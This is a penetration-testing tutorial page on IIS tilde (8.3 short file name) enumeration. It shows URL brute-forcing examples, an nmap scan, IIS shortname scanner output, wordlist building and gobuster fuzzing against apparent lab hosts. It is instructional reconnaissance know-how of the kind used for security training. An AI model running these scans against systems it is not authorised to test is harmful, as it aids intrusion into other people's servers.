# IIS Tilde

### Enumeration

IIS Tilde is an enumeration technique specific to some version of Microsoft IIS web servers that allows you to uncover hidden files, directories and short file names (8.3 format)

When a file or folder is created on an IIS server, a short file name in the 8.3 format is generated. it has 8 characters for the file name, a period, and three characters for the extension. in vulnerable versions these short file names grant access to their files and folders even if they were meant to be hidden.&#x20;

the tilde (\~) followed by a sequence number represents a short file name in a url. if you can figure out a file or folders short name, using the tilde character and short file name they can possible access the hidden resources.

Typically to enumerate this we send multiple HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. Once one is detected this can be used to access the resource or enumerate the directory structure further.&#x20;

### Directory enumeration

```
http://example.com/~a
http://example.com/~b
http://example.com/~c

# Assume server contains a hidden directory called SecretDocuments, when http://example.com/~s is called
# the server replies with 200 revealing the directory with a short name beginning in s
# Once that is discovered we add more characters 
http://example.com/~se
http://example.com/~sf
http://example.com/~sg

# oncce another has been discovered (http://example.com/~se we keep appending characters. 
http://example.com/~sec
http://example.com/~sed
http://example.com/~see

# this process continues until the full short name is discovered - the short name 
# secret~1 is eventually discovered when the server returns a 200 OK status code 
# for the request http://example.com/~secret.
```

### File enumeration&#x20;

Once the directory is discovered we can access files in the directory like so:

```
http://example.com/secret~1/somefile.txt
http://example.com/secret~1/anotherfile.docx
```

We can fuzz for file names using the same method as above

```
http://example.com/secret~1/a
http://example.com/secret~1/b
http://example.com/secret~1/c
```

In 8.3 short file names, such as `somefi~1.txt`, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde (`~`) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.

For example, if two files named `somefile.txt` and `somefile1.txt` exist in the same directory, their 8.3 short file names would be:

* `somefi~1.txt` for `somefile.txt`
* `somefi~2.txt` for `somefile1.txt`

### Scanning&#x20;

We are looking for an IIS server:

```shell-session
nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds

```

#### IIS shortname scanner&#x20;

> New tool in Go:&#x20;
>
> [https://github.com/bitquark/shortscan.git](https://github.com/bitquark/shortscan.git)
>
> Old tool:&#x20;
>
> [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

```shell-session
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

In the above example, we discover two direectories and 3 files, but GET access to `http://10.129.204.231/TRANSF~1.ASP` is not allowed, so we will need to fuzz for the short file name to attempt to access the resource&#x20;

> During enumeration we would want to perform this recursively on all files and directories to uncover the structure and see all interesting resources.&#x20;

### Generate custom shortname wordlist

as per above the resource `http://10.129.204.231/TRANSF~1.ASP` was discovered but cannot be accessed. we can create our own custom wordlist with all entries that start with "transf".&#x20;

```shell-session
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

| **Command Part**    | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `egrep -r ^transf`  | The `egrep` command is used to search for lines containing a specific pattern in the input files. The `-r` flag indicates a recursive search through directories. The `^transf` pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.                                                                                           |
| `\|`                | The pipe symbol (`\|`) is used to pass the output of the first command (`egrep`) to the second command (`sed`). In this case, the lines starting with "transf" and their file names will be the input for the `sed` command.                                                                                                                                                                                                        |
| `sed 's/^[^:]*://'` | The `sed` command is used to perform a find-and-replace operation on its input (in this case, the output of `egrep`). The `'s/^[^:]*://'` expression tells `sed` to find any sequence of characters at the beginning of a line (`^`) up to the first colon (`:`), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons. |
| `> /tmp/list.txt`   | The greater-than symbol (`>`) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named `/tmp/list.txt`.                                                                                                                                                                                                                                                                                  |

### Fuzz with GoBuster

```shell-session
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.204.231/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /tmp/list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/23 15:14:05 Starting gobuster in directory enumeration mode
===============================================================
/transf**.aspx        (Status: 200) [Size: 941]
Progress: 306 / 309 (99.03%)
===============================================================
2023/03/23 15:14:11 Finished
===============================================================
```
